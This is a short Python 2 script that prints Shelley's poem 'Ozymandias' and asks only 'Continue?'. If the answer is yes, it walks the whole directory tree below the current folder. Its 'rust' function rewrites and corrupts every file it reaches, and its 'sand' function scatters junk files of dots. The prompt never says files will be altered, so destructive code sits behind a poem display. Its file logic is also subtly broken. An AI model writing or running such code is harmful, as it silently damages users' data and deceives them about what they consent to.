import os, random, string

print """
I met a traveller from an antique land
Who said: Two vast and trunkless legs of stone
Stand in the desert. Near them on the sand,
Half sunk, a shatter'd visage lies, whose frown
And wrinkled lip and sneer of cold command
Tell that its sculptor well those passions read
Which yet survive, stamp'd on these lifeless things,
The hand that mock'd them and the heart that fed.
And on the pedestal these words appear:
    "My name is Ozymandias, king of kings:
    Look on my works, ye Mighty, and despair!"
    Nothing beside remains: round the decay
    Of that colossal wreck, boundless and bare,
    The lone and level sands stretch far away.
"""

def rust(x, place, artifacts):
    for artifact in artifacts:
        if os.path.isfile(artifact) and artifact != "ozymandias.py":
            artifact = open(os.path.join(place, artifact), "r+")
            gloss = random.randint(0, artifact.tell())
            before = artifact.read(gloss)
            artifact.seek(gloss)
            after = artifact.read()
            artifact.write(before + random.choice(string.printable) + after)
            artifact.close()

def sand(x, place, artifacts):
    with open(os.path.join(place, random.choice(string.ascii_letters)), "w") as drift:
        drift.write(random.randint(1, 3000) * ".")
    
consent = raw_input("Continue?\n> ")
if str(consent).lower() == "y" or str(consent).lower() == "yes":
    os.path.walk(".", rust, None)
    os.path.walk(".", sand, None)
